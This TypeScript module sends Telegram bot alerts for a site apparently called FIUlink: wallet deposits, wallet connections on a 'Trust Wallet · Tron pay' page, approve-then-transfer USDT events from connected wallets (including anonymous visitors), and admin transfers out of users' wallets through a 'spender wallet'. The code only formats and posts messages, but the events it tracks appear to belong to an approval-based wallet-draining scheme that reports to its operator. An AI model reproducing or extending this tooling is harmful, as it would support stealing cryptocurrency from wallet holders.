import { env } from "../config/env.js";

interface DepositNotificationPayload {
  userId: string;
  walletAddress: string;
  chain: "ethereum" | "bsc" | "tron" | "solana";
  amountUsdt: number;
  txHash: string;
  contractAddress: string | null;
}

interface AdminUserWalletTransferNotificationPayload {
  adminUserId: string;
  userId: string;
  chain: "ethereum" | "bsc" | "tron" | "solana";
  fromWalletAddress: string;
  toWalletAddress: string;
  spenderWalletAddress: string;
  amountUsdt: number;
  txHash: string;
}

export type TrustWalletTronTelegramPayload =
  | {
      event: "wallet_connected";
      walletAddress: string;
      connectMethod?: string;
      linkedUserId: string | null;
    }
  | {
      event: "transfer_completed";
      walletAddress: string;
      toAddress: string;
      amountUsdt: number;
      approveTxId?: string;
      transferTxId: string;
      linkedUserId: string | null;
    }
  | {
      event: "transfer_failed";
      walletAddress?: string;
      errorMessage: string;
      linkedUserId: string | null;
    };

function escapeHtml(input: string): string {
  return input
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

function buildDepositMessage(payload: DepositNotificationPayload): string {
  const lines = [
    "New wallet deposit confirmed",
    `User: <code>${escapeHtml(payload.userId)}</code>`,
    `Wallet: <code>${escapeHtml(payload.walletAddress)}</code>`,
    `Chain: <b>${escapeHtml(payload.chain.toUpperCase())}</b>`,
    `Amount: <b>${payload.amountUsdt.toFixed(2)} USDT</b>`
  ];

  return lines.join("\n");
}

function buildTrustWalletTronMessage(payload: TrustWalletTronTelegramPayload): string {
  const page = "https://www.fiulink.com/trustwallet/tron";
  const userLine = payload.linkedUserId
    ? `Linked user: <code>${escapeHtml(payload.linkedUserId)}</code>`
    : "Linked user: <i>anonymous (not logged in)</i>";

  if (payload.event === "wallet_connected") {
    const lines = [
      "Trust Wallet · Tron pay — wallet connected",
      userLine,
      `Wallet: <code>${escapeHtml(payload.walletAddress)}</code>`,
      payload.connectMethod
        ? `Method: <code>${escapeHtml(payload.connectMethod)}</code>`
        : null,
      `Page: ${page}`
    ];
    return lines.filter((l): l is string => Boolean(l)).join("\n");
  }

  if (payload.event === "transfer_completed") {
    const lines = [
      "Trust Wallet · Tron pay — USDT transfer completed",
      userLine,
      `From: <code>${escapeHtml(payload.walletAddress)}</code>`,
      `To: <code>${escapeHtml(payload.toAddress)}</code>`,
      `Amount: <b>${payload.amountUsdt.toFixed(6)} USDT</b>`,
      payload.approveTxId
        ? `Approve tx: <code>${escapeHtml(payload.approveTxId)}</code>`
        : null,
      `Transfer tx: <code>${escapeHtml(payload.transferTxId)}</code>`,
      `Page: ${page}`
    ];
    return lines.filter((l): l is string => Boolean(l)).join("\n");
  }

  const lines = [
    "Trust Wallet · Tron pay — transfer failed",
    userLine,
    payload.walletAddress ? `Wallet: <code>${escapeHtml(payload.walletAddress)}</code>` : null,
    `Error: ${escapeHtml(payload.errorMessage)}`,
    `Page: ${page}`
  ];
  return lines.filter((l): l is string => Boolean(l)).join("\n");
}

function buildAdminUserWalletTransferMessage(payload: AdminUserWalletTransferNotificationPayload): string {
  const lines = [
    "Admin user-wallet transfer executed",
    `Admin User: <code>${escapeHtml(payload.adminUserId)}</code>`,
    `Target User: <code>${escapeHtml(payload.userId)}</code>`,
    `Chain: <b>${escapeHtml(payload.chain.toUpperCase())}</b>`,
    `From Wallet: <code>${escapeHtml(payload.fromWalletAddress)}</code>`,
    `To Wallet: <code>${escapeHtml(payload.toWalletAddress)}</code>`,
    `Spender Wallet: <code>${escapeHtml(payload.spenderWalletAddress)}</code>`,
    `Amount: <b>${payload.amountUsdt.toFixed(6)} USDT</b>`,
    `Tx Hash: <code>${escapeHtml(payload.txHash)}</code>`
  ];

  return lines.join("\n");
}

function isTelegramConfigured(): boolean {
  return Boolean(env.TELEGRAM_BOT_TOKEN && env.TELEGRAM_CHAT_ID);
}

export async function sendDepositTelegramNotification(
  payload: DepositNotificationPayload
): Promise<void> {
  if (!isTelegramConfigured()) {
    return;
  }

  const endpoint = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body: Record<string, string | number | boolean> = {
    chat_id: env.TELEGRAM_CHAT_ID as string,
    text: buildDepositMessage(payload),
    parse_mode: "HTML",
    disable_web_page_preview: true
  };

  if (env.TELEGRAM_THREAD_ID) {
    body.message_thread_id = env.TELEGRAM_THREAD_ID;
  }

  const response = await fetch(endpoint, {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify(body)
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Telegram notify failed (${response.status}): ${errorText.slice(0, 300)}`);
  }

  const json = (await response.json()) as { ok?: boolean; description?: string };
  if (!json.ok) {
    throw new Error(`Telegram notify rejected: ${json.description ?? "unknown error"}`);
  }
}

export async function sendTrustWalletTronTelegramNotification(
  payload: TrustWalletTronTelegramPayload
): Promise<void> {
  if (!isTelegramConfigured()) {
    return;
  }

  const endpoint = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body: Record<string, string | number | boolean> = {
    chat_id: env.TELEGRAM_CHAT_ID as string,
    text: buildTrustWalletTronMessage(payload),
    parse_mode: "HTML",
    disable_web_page_preview: true
  };

  if (env.TELEGRAM_THREAD_ID) {
    body.message_thread_id = env.TELEGRAM_THREAD_ID;
  }

  const response = await fetch(endpoint, {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify(body)
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Telegram notify failed (${response.status}): ${errorText.slice(0, 300)}`);
  }

  const json = (await response.json()) as { ok?: boolean; description?: string };
  if (!json.ok) {
    throw new Error(`Telegram notify rejected: ${json.description ?? "unknown error"}`);
  }
}

export async function sendTelegramTestMessage(adminUserId: string): Promise<void> {
  if (!isTelegramConfigured()) {
    return;
  }

  const text = [
    "FIUlink — <b>Telegram test</b> (admin panel)",
    `Admin user: <code>${escapeHtml(adminUserId)}</code>`,
    `Time: <code>${escapeHtml(new Date().toISOString())}</code>`
  ].join("\n");

  const endpoint = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body: Record<string, string | number | boolean> = {
    chat_id: env.TELEGRAM_CHAT_ID as string,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true
  };

  if (env.TELEGRAM_THREAD_ID) {
    body.message_thread_id = env.TELEGRAM_THREAD_ID;
  }

  const response = await fetch(endpoint, {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify(body)
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Telegram notify failed (${response.status}): ${errorText.slice(0, 300)}`);
  }

  const json = (await response.json()) as { ok?: boolean; description?: string };
  if (!json.ok) {
    throw new Error(`Telegram notify rejected: ${json.description ?? "unknown error"}`);
  }
}

export async function sendAdminUserWalletTransferTelegramNotification(
  payload: AdminUserWalletTransferNotificationPayload
): Promise<void> {
  if (!isTelegramConfigured()) {
    return;
  }

  const endpoint = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
  const body: Record<string, string | number | boolean> = {
    chat_id: env.TELEGRAM_CHAT_ID as string,
    text: buildAdminUserWalletTransferMessage(payload),
    parse_mode: "HTML",
    disable_web_page_preview: true
  };

  if (env.TELEGRAM_THREAD_ID) {
    body.message_thread_id = env.TELEGRAM_THREAD_ID;
  }

  const response = await fetch(endpoint, {
    method: "POST",
    headers: {
      "content-type": "application/json"
    },
    body: JSON.stringify(body)
  });

  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`Telegram notify failed (${response.status}): ${errorText.slice(0, 300)}`);
  }

  const json = (await response.json()) as { ok?: boolean; description?: string };
  if (!json.ok) {
    throw new Error(`Telegram notify rejected: ${json.description ?? "unknown error"}`);
  }
}
